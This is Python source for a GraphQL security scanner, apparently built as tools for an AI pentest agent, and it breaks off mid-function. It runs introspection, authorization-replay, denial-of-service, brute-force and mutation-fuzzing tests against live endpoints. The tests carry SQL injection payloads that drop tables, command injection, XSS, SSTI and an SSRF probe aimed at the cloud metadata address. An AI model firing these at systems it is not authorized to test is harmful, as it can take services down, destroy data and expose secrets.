"""
GraphQL Security Scanner

Comprehensive GraphQL vulnerability testing:
- Introspection query analysis
- Depth limit bypass
- Batch query attacks (DoS)
- Field suggestion enumeration
- Authorization bypass
- SQL injection in queries
- Nested query DoS
"""

from __future__ import annotations

import json
import time
import urllib.parse

import requests

from src.sdk.finding_lifecycle import get_finding_lifecycle
from src.sdk.tool import function_tool

_DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (CyberCoPilot/1.0 GraphQL-Scanner)",
    "Content-Type": "application/json"
}
_TIMEOUT = 30


def _parse_headers(headers: str) -> dict:
    try:
        parsed = json.loads(headers or "{}")
        if isinstance(parsed, dict):
            return {**_DEFAULT_HEADERS, **parsed}
    except Exception:
        pass
    return _DEFAULT_HEADERS.copy()


def _type_name(type_ref: dict | None) -> str:
    current = type_ref or {}
    wrappers = []
    while current:
        kind = current.get("kind", "")
        name = current.get("name")
        if name:
            wrappers.append(name)
        elif kind:
            wrappers.append(kind)
        current = current.get("ofType") or {}
    return "/".join(wrappers) if wrappers else "Unknown"


def _argument_names(field: dict) -> list[str]:
    return [str(arg.get("name", "")) for arg in field.get("args", []) if arg.get("name")]


def _looks_like_object_arg(arg_name: str) -> bool:
    return any(h in arg_name.lower() for h in ("id", "uuid", "node", "account", "org", "tenant", "user", "owner"))


@function_tool()
def graphql_schema_inventory(
    url: str,
    headers: str = "{}",
    max_fields: int = 80,
) -> str:
    """
    Safely inventory a GraphQL endpoint without DoS-style tests.

    Extracts schema operations, argument names, object-ID candidates,
    mutations, sensitive fields, and concrete follow-up authz tests. This is
    intended to precede resolver-level replay with two owned accounts.
    """
    request_headers = _parse_headers(headers)
    query = {
        "query": """
        query CyberCoPilotSchemaInventory {
          __schema {
            queryType { name }
            mutationType { name }
            types {
              name
              kind
              fields {
                name
                args { name type { kind name ofType { kind name ofType { kind name } } } }
                type { kind name ofType { kind name ofType { kind name } } }
              }
            }
          }
        }
        """
    }
    out = ["## GraphQL Schema Inventory", f"Endpoint: {url}", ""]
    try:
        response = requests.post(url, json=query, headers=request_headers, timeout=_TIMEOUT, verify=False)
    except Exception as exc:
        return f"GraphQL schema inventory failed: {exc}"
    out.append(f"HTTP {response.status_code} len={len(response.text or '')}")
    if response.status_code != 200:
        out.append("Introspection did not return HTTP 200. Use authenticated headers or graphql_url if this endpoint is protected.")
        return "\n".join(out)
    try:
        data = response.json()
    except Exception:
        out.append("Response was not valid JSON.")
        return "\n".join(out)
    if data.get("errors"):
        out.append("Introspection errors:")
        out.append(json.dumps(data.get("errors"), indent=2)[:1600])
        out.append("Next: test field suggestions and replay known application queries captured from browser/API traffic.")
        return "\n".join(out)

    schema = data.get("data", {}).get("__schema", {})
    types = schema.get("types", [])
    query_type = (schema.get("queryType") or {}).get("name") or "Query"
    mutation_type = (schema.get("mutationType") or {}).get("name") or "Mutation"
    operations = []
    mutations = []
    sensitive = []
    object_arg_ops = []
    sensitive_keywords = ("password", "secret", "token", "key", "admin", "private", "email", "phone", "role")

    for type_info in types:
        type_name = type_info.get("name", "")
        fields = type_info.get("fields") or []
        if type_name in {query_type, mutation_type}:
            for field in fields:
                item = {
                    "operation": field.get("name", ""),
                    "type": "mutation" if type_name == mutation_type else "query",
                    "args": _argument_names(field),
                    "returns": _type_name(field.get("type")),
                }
                operations.append(item)
                if item["type"] == "mutation":
                    mutations.append(item)
                if any(_looks_like_object_arg(arg) for arg in item["args"]):
                    object_arg_ops.append(item)
        for field in fields:
            fname = f"{type_name}.{field.get('name', '')}"
            if any(k in fname.lower() for k in sensitive_keywords):
                sensitive.append(fname)

    out.append(f"Operations: {len(operations)}")
    out.append(f"Mutations: {len(mutations)}")
    out.append(f"Object/tenant argument operations: {len(object_arg_ops)}")
    out.append(f"Sensitive-looking fields: {len(sensitive)}")
    out.append("")
    out.append("### High-Value Resolver Authz Targets")
    for item in object_arg_ops[:max_fields]:
        out.append(f"- {item['type']} {item['operation']}({', '.join(item['args'])}) -> {item['returns']}")
    out.append("")
    out.append("### Mutations Requiring Side-Effect Controls")
    for item in mutations[:20]:
        out.append(f"- {item['operation']}({', '.join(item['args'])})")
    out.append("")
    out.append("### Sensitive Field Names")
    out.append(", ".join(sensitive[:40]) if sensitive else "(none)")
    out.append("")
    out.append("### Next Validation")
    out.append("- Capture real browser/API GraphQL operations with variables.")
    out.append("- Replay read-only object resolvers as user A, user B, and unauthenticated control.")
    out.append("- For mutations, validate only on owned test objects and compare before/after state.")
    return "\n".join(out)


@function_tool()
def graphql_authz_replay_probe(
    url: str,
    query: str,
    variables_user_a: str = "{}",
    variables_user_b: str = "{}",
    headers_user_a: str = "{}",
    headers_user_b: str = "{}",
    include_unauth_control: bool = True,
) -> str:
    """
    Replay one captured GraphQL operation across two accounts and optional
    unauthenticated control. This avoids noisy generic queries and focuses on
    resolver-level authorization impact.
    """
    contexts = [
        ("user_a", _parse_headers(headers_user_a), variables_user_a),
        ("user_b", _parse_headers(headers_user_b), variables_user_b or variables_user_a),
    ]
    if include_unauth_control:
        contexts.append(("unauth", _DEFAULT_HEADERS.copy(), variables_user_a))

    results = {}
    for label, request_headers, variables_raw in contexts:
        try:
            variables = json.loads(variables_raw or "{}")
        except Exception:
            variables = {}
        try:
            response = requests.post(
                url,
                json={"query": query, "variables": variables},
                headers=request_headers,
                timeout=_TIMEOUT,
                verify=False,
            )
            body = response.text or ""
            json_keys = []
            try:
                parsed = response.json()
                json_keys = sorted(parsed.get("data", {}).keys()) if isinstance(parsed.get("data"), dict) else []
            except Exception:
                pass
            results[label] = {
                "status": response.status_code,
                "length": len(body),
                "hash16": __import__("hashlib").sha256(body[:5000].encode()).hexdigest()[:16],
                "data_keys": json_keys[:20],
                "preview": body[:220],
            }
        except Exception as exc:
            results[label] = {"status": 0, "length": 0, "error": str(exc)[:140]}

    a = results.get("user_a", {})
    findings = []
    for label in ("user_b", "unauth"):
        current = results.get(label)
        if not current:
            continue
        if current.get("status") == a.get("status") == 200 and (
            current.get("hash16") == a.get("hash16")
            or abs(int(current.get("length", 0)) - int(a.get("length", 0))) < 80
            or current.get("data_keys")
        ):
            findings.append(label)

    out = ["## GraphQL Authz Replay Probe", f"Endpoint: {url}", ""]
    for label, data in results.items():
        out.append(
            f"- {label}: HTTP {data.get('status')} len={data.get('length')} "
            f"hash={data.get('hash16', '-')} keys={','.join(data.get('data_keys', [])) or '-'}"
        )
    if findings:
        lifecycle = get_finding_lifecycle()
        finding = lifecycle.add_candidate(
            title="Potential GraphQL Resolver Authorization Bypass",
            target=urllib.parse.urlparse(url).netloc,
            severity="critical",
            endpoint=url,
            parameter="variables",
            category="graphql-idor",
            evidence=(
                "GraphQL resolver replay produced similar successful data across lower-privilege contexts.\n"
                "Negative control included where available.\n"
                f"{json.dumps(results, indent=2)[:2500]}"
            ),
            scope_source="graphql_authz_replay_probe",
        )
        out.append("")
        out.append(f"Candidate registered: {finding.fingerprint}")
        out.append("Promotion requires proving object ownership and showing user A can read/modify user B's object.")
    else:
        out.append("")
        out.append("No GraphQL authz candidate registered. Use real captured operations, node IDs, and tenant/org variables.")
    return "\n".join(out)


@function_tool()
def graphql_security_scanner(
    url: str,
    introspection: bool = True,
    depth_limit_bypass: bool = True,
    batch_queries: bool = True,
    field_suggestion: bool = True,
    auth_bypass: bool = True,
    sqli_test: bool = True,
    engine_fingerprint: bool = True,
    schema_guessing: bool = True,
    mutation_fuzzing: bool = True,
    alias_overloading: bool = True,
    headers: str = "{}",
) -> str:
    """
    Comprehensive GraphQL security testing.
    
    Tests for:
    1. Introspection enabled (information disclosure)
    2. Depth limit bypass (nested query DoS)
    3. Batch query attacks (DoS via array-based batching)
    4. Field suggestion enumeration (typo-based field discovery)
    5. Authorization bypass (access control issues)
    6. SQL injection in query arguments
    7. Engine Fingerprinting (detect GraphQL server implementation)
    8. Schema Guessing (Bruteforce common query roots)
    9. Mutation Fuzzing (Aggressive XSS/SSRF/SQLi payloads)
    10. Alias Overloading (Query Complexity DoS)
    
    Args:
        url: GraphQL endpoint URL
        introspection: Test if introspection is enabled
        depth_limit_bypass: Test depth limit bypass
        batch_queries: Test batch query DoS
        field_suggestion: Test field suggestion enumeration
        auth_bypass: Test authorization bypass
        sqli_test: Test SQL injection in arguments
        engine_fingerprint: Test engine fingerprinting
        schema_guessing: Test aggressive schema guessing
        mutation_fuzzing: Test aggressive mutation fuzzing
        alias_overloading: Test Alias Overloading DoS via high alias count
        headers: JSON string of custom headers (e.g. auth tokens)
    
    Returns:
        GraphQL security assessment results
    """
    output = ["═══════════════════════════════════════════════════════════",
              "         GRAPHQL SECURITY SCANNER (AGGRESSIVE)",
              "═══════════════════════════════════════════════════════════", ""]
    
    findings = []
    extracted_mutations = []
    
    # Parse custom headers
    try:
        custom_headers = json.loads(headers)
        request_headers = {**_DEFAULT_HEADERS, **custom_headers}
    except:
        request_headers = _DEFAULT_HEADERS.copy()
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 1: Introspection Query
    # ══════════════════════════════════════════════════════════════════════
    if introspection:
        output.append("── Test 1: Introspection Query ────────────────────────")
        
        introspection_query = {
            "query": """
                query IntrospectionQuery {
                    __schema {
                        queryType { name }
                        mutationType { name }
                        subscriptionType { name }
                        types {
                            name
                            kind
                            description
                            fields {
                                name
                                description
                                args {
                                    name
                                    type { name kind ofType { name kind } }
                                }
                                type {
                                    name
                                    kind
                                    ofType { name kind }
                                }
                            }
                        }
                    }
                }
            """
        }
        
        try:
            r = requests.post(url, json=introspection_query, headers=request_headers,
                            timeout=_TIMEOUT, verify=False)
            
            if r.status_code == 200:
                data = r.json()
                
                if 'data' in data and '__schema' in data['data']:
                    findings.append("HIGH → Introspection is ENABLED - full schema exposed")
                    
                    schema = data['data']['__schema']
                    types = schema.get('types', [])
                    
                    # Extract interesting types (exclude built-ins)
                    custom_types = [t for t in types if not t['name'].startswith('__')]
                    
                    mutation_type_name = schema.get('mutationType', {}).get('name') if schema.get('mutationType') else None
                    if mutation_type_name:
                        for t in custom_types:
                            if t['name'] == mutation_type_name:
                                if t.get('fields'):
                                    for field in t['fields']:
                                        extracted_mutations.append(field)
                                        
                    output.append("  ✓ Introspection ENABLED")
                    output.append(f"  Found {len(custom_types)} custom types:")
                    
                    for t in custom_types[:10]:
                        output.append(f"    • {t['name']} ({t['kind']})")
                        if t.get('fields'):
                            for field in t['fields'][:3]:
                                output.append(f"      - {field['name']}")
                    
                    if len(custom_types) > 10:
                        output.append(f"    ... and {len(custom_types) - 10} more types")
                    
                    # Look for sensitive fields
                    sensitive_keywords = ['password', 'secret', 'token', 'key', 'admin', 'private']
                    sensitive_fields = []
                    
                    for t in custom_types:
                        if t.get('fields'):
                            for field in t['fields']:
                                if any(kw in field['name'].lower() for kw in sensitive_keywords):
                                    sensitive_fields.append(f"{t['name']}.{field['name']}")
                    
                    if sensitive_fields:
                        findings.append(f"CRITICAL → Found {len(sensitive_fields)} sensitive fields in schema")
                        output.append("\n  ⚠ Sensitive fields found:")
                        for sf in sensitive_fields[:10]:
                            output.append(f"    • {sf}")
                
                elif 'errors' in data:
                    output.append(f"  ✗ Introspection blocked: {data['errors'][0].get('message', 'Unknown error')}")
                else:
                    output.append("  ✗ Unexpected response format")
            else:
                output.append(f"  ✗ HTTP {r.status_code}")
        
        except Exception as e:
            output.append(f"  ✗ Error: {e}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 2: Depth Limit Bypass (Nested Query DoS)
    # ══════════════════════════════════════════════════════════════════════
    if depth_limit_bypass:
        output.append("── Test 2: Depth Limit Bypass (Nested Query DoS) ──────")
        
        # Generate deeply nested query
        depth_levels = [5, 10, 20, 50]
        
        for depth in depth_levels:
            nested_query = "query { "
            for i in range(depth):
                nested_query += "user { "
            nested_query += "id"
            for i in range(depth):
                nested_query += " }"
            nested_query += " }"
            
            try:
                start = time.time()
                r = requests.post(url, json={"query": nested_query}, headers=request_headers,
                                timeout=_TIMEOUT, verify=False)
                elapsed = time.time() - start
                
                if r.status_code == 200:
                    findings.append(f"HIGH → Depth limit bypass successful at depth {depth} ({elapsed:.2f}s)")
                    output.append(f"  ✓ Depth {depth}: HTTP 200 ({elapsed:.2f}s) - NO DEPTH LIMIT")
                    break
                elif r.status_code == 400:
                    data = r.json()
                    if 'errors' in data and 'depth' in str(data['errors']).lower():
                        output.append(f"  ✗ Depth {depth}: Blocked by depth limit")
                        break
                    else:
                        output.append(f"  ⚠ Depth {depth}: HTTP 400 - {data.get('errors', ['Unknown'])[0].get('message', '')[:50]}")
                else:
                    output.append(f"  ✗ Depth {depth}: HTTP {r.status_code}")
            
            except requests.exceptions.Timeout:
                findings.append(f"CRITICAL → Depth {depth} caused timeout - DoS vulnerability")
                output.append(f"  ⚠ Depth {depth}: TIMEOUT - DoS successful")
                break
            except Exception as e:
                output.append(f"  ✗ Depth {depth}: Error - {e}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 3: Batch Query Attack (DoS)
    # ══════════════════════════════════════════════════════════════════════
    if batch_queries:
        output.append("── Test 3: Batch Query Attack (DoS) ───────────────────")
        
        batch_sizes = [10, 50, 100]
        
        for batch_size in batch_sizes:
            # Array-based batching
            batch_query = [{"query": "{ __typename }"} for _ in range(batch_size)]
            
            try:
                start = time.time()
                r = requests.post(url, json=batch_query, headers=request_headers,
                                timeout=_TIMEOUT, verify=False)
                elapsed = time.time() - start
                
                if r.status_code == 200:
                    findings.append(f"MEDIUM → Batch queries accepted (size {batch_size}) - potential DoS")
                    output.append(f"  ✓ Batch {batch_size}: HTTP 200 ({elapsed:.2f}s) - BATCHING ALLOWED")
                    
                    # Try larger batch
                    continue
                else:
                    output.append(f"  ✗ Batch {batch_size}: HTTP {r.status_code} - batching blocked")
                    break
            
            except requests.exceptions.Timeout:
                findings.append(f"CRITICAL → Batch {batch_size} caused timeout - DoS vulnerability")
                output.append(f"  ⚠ Batch {batch_size}: TIMEOUT - DoS successful")
                break
            except Exception as e:
                output.append(f"  ✗ Batch {batch_size}: Error - {e}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 4: Field Suggestion Enumeration
    # ══════════════════════════════════════════════════════════════════════
    if field_suggestion:
        output.append("── Test 4: Field Suggestion Enumeration ───────────────")
        
        # Try common field names with typos to trigger suggestions
        test_fields = [
            "userr",  # user
            "passwor",  # password
            "emai",  # email
            "toke",  # token
            "secre",  # secret
            "admi",  # admin
        ]
        
        discovered_fields = []
        
        for field in test_fields:
            query = f"{{ {field} }}"
            
            try:
                r = requests.post(url, json={"query": query}, headers=request_headers,
                                timeout=_TIMEOUT, verify=False)
                
                if r.status_code == 400:
                    data = r.json()
                    if 'errors' in data:
                        error_msg = str(data['errors'])
                        
                        # Look for field suggestions in error message
                        if 'did you mean' in error_msg.lower():
                            findings.append("MEDIUM → Field suggestions enabled - information disclosure")
                            output.append(f"  ✓ Field '{field}': Suggestions found in error")
                            output.append(f"    {error_msg[:200]}")
                            discovered_fields.append(field)
                        else:
                            output.append(f"  ✗ Field '{field}': No suggestions")
            
            except Exception as e:
                output.append(f"  ✗ Field '{field}': Error - {e}")
        
        if discovered_fields:
            output.append(f"\n  ⚠ Field suggestion enabled for {len(discovered_fields)} fields")
        else:
            output.append("  ✓ Field suggestions appear to be disabled")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 5: Authorization Bypass
    # ══════════════════════════════════════════════════════════════════════
    if auth_bypass:
        output.append("── Test 5: Authorization Bypass ───────────────────────")
        
        # Test queries that should require authentication
        auth_test_queries = [
            "{ users { id email } }",
            "{ me { id email role } }",
            "{ admin { users } }",
            "{ currentUser { id email password } }",
        ]
        
        for query in auth_test_queries:
            try:
                # Test without auth headers
                r = requests.post(url, json={"query": query}, headers=_DEFAULT_HEADERS,
                                timeout=_TIMEOUT, verify=False)
                
                if r.status_code == 200:
                    data = r.json()
                    if 'data' in data and data['data']:
                        findings.append(f"CRITICAL → Authorization bypass: '{query[:30]}...' accessible without auth")
                        output.append(f"  ✓ Query accessible without auth: {query[:40]}...")
                    else:
                        output.append(f"  ✗ Query blocked: {query[:40]}...")
                else:
                    output.append(f"  ✗ HTTP {r.status_code}: {query[:40]}...")
            
            except Exception as e:
                output.append(f"  ✗ Error: {e}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 6: SQL Injection in Arguments
    # ══════════════════════════════════════════════════════════════════════
    if sqli_test:
        output.append("── Test 6: SQL Injection in Arguments ─────────────────")
        
        sqli_payloads = [
            "' OR '1'='1",
            "1' OR '1'='1",
            "' UNION SELECT NULL--",
            "1; DROP TABLE users--",
        ]
        
        # Test with common argument names
        arg_names = ["id", "userId", "email", "username"]
        
        for arg_name in arg_names:
            for payload in sqli_payloads[:2]:  # Test first 2 payloads per arg
                query = f'{{ user({arg_name}: "{payload}") {{ id }} }}'
                
                try:
                    r = requests.post(url, json={"query": query}, headers=request_headers,
                                    timeout=_TIMEOUT, verify=False)
                    
                    if r.status_code == 500:
                        findings.append(f"HIGH → Possible SQLi in argument '{arg_name}' with payload: {payload}")
                        output.append(f"  ⚠ HTTP 500 with {arg_name}='{payload[:20]}...' - possible SQLi")
                    elif r.status_code == 200:
                        data = r.json()
                        if 'errors' in data:
                            error_msg = str(data['errors']).lower()
                            if any(kw in error_msg for kw in ['sql', 'syntax', 'mysql', 'postgresql']):
                                findings.append(f"HIGH → SQL error in argument '{arg_name}': {payload}")
                                output.append(f"  ⚠ SQL error with {arg_name}='{payload[:20]}...'")
                
                except Exception as e:
                    output.append(f"  ✗ Error testing {arg_name}: {e}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Test 7: Engine Fingerprinting
    # ══════════════════════════════════════════════════════════════════════
    if engine_fingerprint:
        output.append("── Test 7: Engine Fingerprinting ──────────────────────")
        
        try:
            # Malformed query to trigger engine-specific error responses
            r1 = requests.post(url, json={"query": "{ __xyz_unknown_field }"}, headers=request_headers, timeout=_TIMEOUT, verify=False)
            error_text = r1.text.lower()
            
            engine = "Unknown"
            if 'x-hasura' in r1.headers or 'query_root' in error_text:
                engine = "Hasura"
            elif 'apollo' in str(r1.headers).lower() or 'apollo' in error_text:
                engine = "Apollo"
            elif 'graphql-ruby' in error_text:
                engine = "GraphQL-Ruby"
            elif 'graphql/execution/executor' in error_text or 'graphene' in error_text:
                engine = "Graphene (Python)"
            elif 'sangria' in error_text:
                engine = "Sangria (Scala)"
            elif 'absinthe' in error_text:
                engine = "Absinthe (Elixir)"
            
            if engine != "Unknown":
                findings.append(f"INFO → GraphQL Engine fingerprinted as: {engine}")
                output.append(f"  ✓ Engine detected: {engine}")
            else:
                output.append("  ✗ Could not determine GraphQL engine")
                
        except Exception as e:
            output.append(f"  ✗ Error: {e}")
        output.append("")

    # ══════════════════════════════════════════════════════════════════════
    # Test 8: Aggressive Schema Guessing (Bruteforce)
    # ══════════════════════════════════════════════════════════════════════
    if schema_guessing:
        output.append("── Test 8: Aggressive Schema Guessing (Bruteforce) ────")
        # Common query root fields
        common_roots = [
            "user", "users", "admin", "admins", "profile", "account", "settings", 
            "config", "secret", "secrets", "password", "passwords", "token", "tokens",
            "auth", "login", "payment", "payments", "order", "orders", "transaction",
            "transactions", "log", "logs", "message", "messages", "email", "emails",
            "file", "files", "upload", "uploads", "download", "downloads", "api", "apis",
            "key", "keys", "system", "health", "status", "debug", "test", "dev"
        ]
        
        discovered_roots = set()
        
        for root in common_roots:
            query = f"query {{ {root} {{ __typename }} }}"
            try:
                r = requests.post(url, json={"query": query}, headers=request_headers, timeout=_TIMEOUT, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    if 'data' in data and data['data'] and data['data'].get(root):
                        discovered_roots.add(root)
                        output.append(f"  ✓ Found valid query root: '{root}'")
                elif r.status_code == 400:
                    # Look for field suggestions
                    data = r.json()
                    if 'errors' in data:
                        error_msg = str(data['errors'])
                        if 'did you mean' in error_msg.lower():
                            # Extract suggested fields
                            import re
                            suggestions = re.findall(r'did you mean "(.*?)"', error_msg, re.IGNORECASE)
                            for s in suggestions:
                                discovered_roots.add(s)
                                output.append(f"  ✓ Guessed root via suggestion: '{s}'")
            except Exception:
                pass
                
        if discovered_roots:
            findings.append(f"HIGH → Bruteforced {len(discovered_roots)} schema query roots")
            output.append(f"\n  ⚠ Total discovered roots: {len(discovered_roots)}")
        else:
            output.append("  ✗ No new query roots discovered via bruteforce")
        output.append("")

    # ══════════════════════════════════════════════════════════════════════
    # Test 9: Aggressive Mutation Fuzzing
    # ══════════════════════════════════════════════════════════════════════
    if mutation_fuzzing:
        output.append("── Test 9: Aggressive Mutation Fuzzing ────────────────")
        if not extracted_mutations:
            output.append("  ✗ No mutations extracted from introspection. Skipping.")
        else:
            output.append(f"  ⚠ Fuzzing {len(extracted_mutations)} discovered mutations...")
            
            fuzz_payloads = [
                "'\"><script>alert(1)</script>",  # XSS
                "http://169.254.169.254/latest/meta-data/",  # SSRF / Cloud metadata
                "'; DROP TABLE users;--",  # SQLi
                "$(id)",  # Command Injection
                "{{7*7}}" # SSTI
            ]
            
            fuzzing_findings = 0
            for mutation in extracted_mutations[:5]: # limit to first 5 to avoid spam/timeout
                m_name = mutation['name']
                args = mutation.get('args', [])
                
                # Build a generic mutation call
                args_str = ""
                if args:
                    arg_pairs = []
                    for arg in args:
                        # Best effort typing
                        arg_name = arg['name']
                        arg_type_kind = arg.get('type', {}).get('kind', '')
                        arg_type_name = arg.get('type', {}).get('name', '')
                        
                        if arg_type_name == 'Int' or arg_type_kind == 'SCALAR':
                            arg_pairs.append(f"{arg_name}: 1337") # Try numeric first
                        elif arg_type_name == 'Boolean':
                            arg_pairs.append(f"{arg_name}: true")
                        else:
                            arg_pairs.append(f'{arg_name}: "FUZZ"')
                    
                    args_str = f"({', '.join(arg_pairs)})"
                
                for payload in fuzz_payloads:
                    if "FUZZ" not in args_str:
                        continue # Skip if no string arguments to fuzz
                    
                    fuzzed_args = args_str.replace("FUZZ", payload.replace('"', '\\"'))
                    mut_query = f"mutation {{ {m_name}{fuzzed_args} {{ __typename }} }}"
                    
                    try:
                        r = requests.post(url, json={"query": mut_query}, headers=request_headers, timeout=_TIMEOUT, verify=False)
                        if r.status_code == 500:
                            findings.append(f"HIGH → Mutation '{m_name}' crashed (HTTP 500) with payload: {payload[:20]}")
                            output.append(f"  ⚠ Crash on mutation '{m_name}' with payload: {payload[:15]}...")
                            fuzzing_findings += 1
                        elif r.status_code == 200:
                            data = r.json()
                            if 'errors' in data:
                                err_str = str(data['errors']).lower()
                                if any(x in err_str for x in ['sql', 'syntax', 'mysql', 'postgresql', 'sqlite', 'ora-']):
                                    findings.append(f"CRITICAL → SQL Injection in mutation '{m_name}' with payload: {payload[:20]}")
                                    output.append(f"  ⚠ SQLi exposed in '{m_name}'")
                                    fuzzing_findings += 1
                    except Exception:
                        pass
                        
            if fuzzing_findings == 0:
                output.append("  ✓ No critical crashes or obvious injections found in fuzzed mutations.")
            
        output.append("")

    # ══════════════════════════════════════════════════════════════════════
    # Test 10: Alias Overloading (Query Complexity DoS)
    # ══════════════════════════════════════════════════════════════════════
    if alias_overloading:
        output.append("── Test 10: Alias Overloading DoS ─────────────────────")
        
        # Build a query with 100 aliases calling a simple field
        aliases = []
        for i in range(100):
            aliases.append(f"alias{i}: __typename")
        
        alias_query = "query { " + " ".join(aliases) + " }"
        
        try:
            start_time = time.time()
            r = requests.post(url, json={"query": alias_query}, headers=request_headers, timeout=_TIMEOUT, verify=False)
            elapsed = time.time() - start_time
            
            if r.status_code == 200:
                data = r.json()
                if 'data' in data and data['data'] and 'alias99' in data['data']:
                    findings.append("HIGH → Vulnerable to Alias Overloading DoS (Query Complexity bypass)")
                    output.append(f"  ⚠ HTTP 200: Successfully executed 100 aliases in {elapsed:.2f}s")
                    output.append("    (This bypasses depth limits and can exhaust server resources)")
                else:
                    output.append("  ✗ Aliases were not executed successfully.")
            elif r.status_code == 400:
                output.append("  ✓ Blocked: Server rejected large number of aliases")
            else:
                output.append(f"  ✗ HTTP {r.status_code}")
                
        except requests.exceptions.Timeout:
            findings.append("CRITICAL → Alias Overloading caused a Timeout (DoS successful)")
            output.append("  ⚠ TIMEOUT: Alias overloading successfully DoS'd the endpoint")
        except Exception as e:
            output.append(f"  ✗ Error: {e}")
            
        output.append("")

    # ══════════════════════════════════════════════════════════════════════
    # Summary
    # ══════════════════════════════════════════════════════════════════════
    output.append("═══════════════════════════════════════════════════════════")
    output.append("                      SUMMARY")
    output.append("═══════════════════════════════════════════════════════════")
    
    if findings:
        output.append(f"\n🔴 Found {len(findings)} GraphQL vulnerabilities:\n")
        for finding in findings:
            output.append(f"  • {finding}")
        
        output.append("\n📋 Remediation:")
        output.append("  1. Disable introspection in production")
        output.append("  2. Implement query depth limits (max 10-15)")
        output.append("  3. Disable batch queries or limit batch size")
        output.append("  4. Disable field suggestions in production")
        output.append("  5. Implement proper authorization checks")
        output.append("  6. Use parameterized queries to prevent SQLi")
        output.append("  7. Implement query complexity analysis")
        output.append("  8. Add rate limiting per client")
    else:
        output.append("\n✅ No obvious GraphQL vulnerabilities detected.")
        output.append("   Consider manual testing with GraphQL-specific tools")
    
    return "\n".join(output)


@function_tool()
def graphql_introspection_dump(
    url: str,
    headers: str = "{}",
    output_file: str = "",
) -> str:
    """
    Dump full GraphQL schema via introspection query.
    
    Args:
        url: GraphQL endpoint URL
        headers: JSON string of custom headers
        output_file: Optional file path to save schema JSON
    
    Returns:
        Full GraphQL schema or error message
    """
    try:
        custom_headers = json.loads(headers)
        request_headers = {**_DEFAULT_HEADERS, **custom_headers}
    except:
        request_headers = _DEFAULT_HEADERS.copy()
    
    introspection_query = {
        "query": """
            query IntrospectionQuery {
                __schema {
                    queryType { name }
                    mutationType { name }
                    subscriptionType { name }
                    types {
                        ...FullType
                    }
                    directives {
                        name
                        description
                        locations
                        args {
                            ...InputValue
                        }
                    }
                }
            }
            
            fragment FullType on __Type {
                kind
                name
                description
                fields(includeDeprecated: true) {
                    name
                    description
                    args {
                        ...InputValue
                    }
                    type {
                        ...TypeRef
                    }
                    isDeprecated
                    deprecationReason
                }
                inputFields {
                    ...InputValue
                }
                interfaces {
                    ...TypeRef
                }
                enumValues(includeDeprecated: true) {
                    name
                    description
                    isDeprecated
                    deprecationReason
                }
                possibleTypes {
                    ...TypeRef
                }
            }
            
            fragment InputValue on __InputValue {
                name
                description
                type { ...TypeRef }
                defaultValue
            }
            
            fragment TypeRef on __Type {
                kind
                name
                ofType {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                            ofType {
                                kind
                                name
                                ofType {
                                    kind
                                    name
                                    ofType {
                                        kind
                                        name
                                        ofType {
                                            kind
                                            name
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        """
    }
    
    try:
        r = requests.post(url, json=introspection_query, headers=request_headers,
                        timeout=_TIMEOUT, verify=False)
        
        if r.status_code == 200:
            data = r.json()
            
            if 'data' in data and '__schema' in data['data']:
                schema_json = json.dumps(data, indent=2)
                
                if output_file:
                    try:
                        with open(output_file, 'w') as f:
                            f.write(schema_json)
                        return f"✓ Schema dumped to {output_file}\n\n{schema_json[:1000]}..."
                    except Exception as e:
                        return f"Error saving to file: {e}\n\n{schema_json[:1000]}..."
                else:
                    return schema_json
            else:
                return f"Error: {data.get('errors', 'Unknown error')}"
        else:
            return f"Error: HTTP {r.status_code}"
    
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def graphql_endpoint_finder(
    base_url: str,
    headers: str = "{}",
) -> str:
    """
    Bruteforce and detect hidden GraphQL endpoints on a target host.
    Also detects common GraphQL IDEs (GraphiQL, Playground).
    
    Args:
        base_url: Target base URL (e.g. https://target.com)
        headers: JSON string of custom headers
        
    Returns:
        List of discovered GraphQL endpoints and IDE interfaces
    """
    base_url = base_url.rstrip("/")
    
    try:
        custom_headers = json.loads(headers)
        request_headers = {**_DEFAULT_HEADERS, **custom_headers}
    except:
        request_headers = _DEFAULT_HEADERS.copy()
        
    endpoints = [
        "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql", "/v3/graphql",
        "/graphql/v1", "/api", "/graphql/api", "/query", "/api/query", "/graphql-api",
        "/__graphql", "/app/graphql", "/api/v1/graphql", "/graphql/console",
        "/.well-known/graphql"
    ]
    
    ides = [
        "/graphiql", "/playground", "/altair", "/explorer", "/graphql-explorer",
        "/graphql/playground", "/api/graphql/playground"
    ]
    
    output = ["═══════════════════════════════════════════════════════════",
              f"         GRAPHQL ENDPOINT FINDER: {base_url}",
              "═══════════════════════════════════════════════════════════", ""]
              
    discovered_endpoints = []
    discovered_ides = []
    
    output.append(f"Scanning {len(endpoints)} common endpoint paths...")
    
    for path in endpoints:
        url = f"{base_url}{path}"
        try:
            # POST test
            r_post = requests.post(url, json={"query": "{__typename}"}, headers=request_headers, timeout=5, verify=False, allow_redirects=False)
            
            is_graphql = False
            if r_post.status_code == 200:
                try:
                    data = r_post.json()
                    if 'data' in data and '__typename' in data['data']:
                        is_graphql = True
                except:
                    pass
            elif r_post.status_code in [400, 405, 401, 403]:
                # If we get 400 Bad Request, check if it complains about GraphQL
                err_text = r_post.text.lower()
                if 'graphql' in err_text or 'must provide query' in err_text or 'syntax error' in err_text or 'unauthorized' in err_text:
                    is_graphql = True
                    
            if is_graphql:
                discovered_endpoints.append(url)
                output.append(f"  [+] FOUND Endpoint: {url} (HTTP {r_post.status_code})")
                
        except Exception:
            pass
            
    output.append(f"\nScanning {len(ides)} common IDE/Playground paths...")
    for path in ides:
        url = f"{base_url}{path}"
        try:
            r_get = requests.get(url, headers=request_headers, timeout=5, verify=False, allow_redirects=False)
            if r_get.status_code == 200:
                html = r_get.text.lower()
